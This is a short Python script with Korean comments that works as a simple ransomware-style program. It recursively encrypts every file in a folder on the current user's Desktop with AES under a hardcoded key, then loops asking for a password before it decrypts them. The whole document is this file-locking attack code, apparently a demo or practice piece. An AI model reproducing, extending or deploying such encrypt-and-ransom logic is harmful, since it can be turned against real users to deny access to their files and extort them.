import AEScipher
import os
from pathlib import Path
#유저의 login name을 return 해주는 함수
from getpass import getuser
#p=Path('Users/*/Desktop'.replace('*',getuser()))

userPath='/Users/name/Desktop/samsung pribnter/'.replace('name',getuser())
p = Path(userPath)

key="김건욱"
a=AEScipher.AEScipher(key)

for x in list(p.glob("**/*")):
    try:
        a.encrypt_file(str(x))
    except PermissionError:
        pass
    print(str(x)+"success encryption")

while True:
    if key==input("풀려면 비밀번호를 맞추세요."):
        print("비밀번호가 맞았습니다.")
        for x in list(p.glob("**/*")):
            try:
                a.decrypt_file(str(x))
            except PermissionError:
                pass
        break
    else:
        print("비밀번호가 틀렸습니다.")
